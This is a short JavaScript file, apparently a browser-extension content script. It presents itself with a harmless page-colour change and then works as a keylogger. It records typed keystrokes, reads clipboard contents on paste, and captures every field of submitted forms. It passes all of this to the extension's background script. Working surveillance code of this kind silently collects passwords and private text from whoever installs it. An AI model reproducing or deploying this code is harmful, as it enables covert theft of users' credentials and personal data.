// Change the background color of the page
document.body.style.backgroundColor = "blue";

let buffer = [];
const THRESHOLD = 30; // Send data every 30 characters
let lastClipboard = '';


// Capture keydown events
const ignoredKeys = [
    'Backspace', 'Tab', 'Shift', 'Control', 'Alt', 'Meta', 
    'ArrowUp', 'ArrowDown', 'ArrowLeft', 'ArrowRight', 
    'Escape', 'CapsLock', 'NumLock', 'ScrollLock', 'Process'
];

document.addEventListener('keydown', (event) => {
    if (ignoredKeys.includes(event.key)) {
        return;
    }
    buffer.push(event.key);
    
    if (buffer.length >= THRESHOLD || event.key === 'Enter') {
        sendDataToBackground(buffer.join(''));
        buffer = []; // Reset buffer
    }
});

// Capture clipboard contents on paste events
document.addEventListener('paste', (event) => {
    navigator.clipboard.readText().then(currentClipboard => {
        if (currentClipboard && currentClipboard !== lastClipboard) {
            lastClipboard = currentClipboard;
            sendDataToBackground(currentClipboard);
        }
    }).catch(err => console.error('Failed to read clipboard:', err));
});


// Capture form submissions
document.querySelector('form')?.addEventListener('submit', (event) => {
    let formData = new FormData(event.target);
    sendDataToBackground(Object.fromEntries(formData));
});

// Send data to background script
function sendDataToBackground(data) {
    browser.runtime.sendMessage({ action: 'sendData', data: data });
}
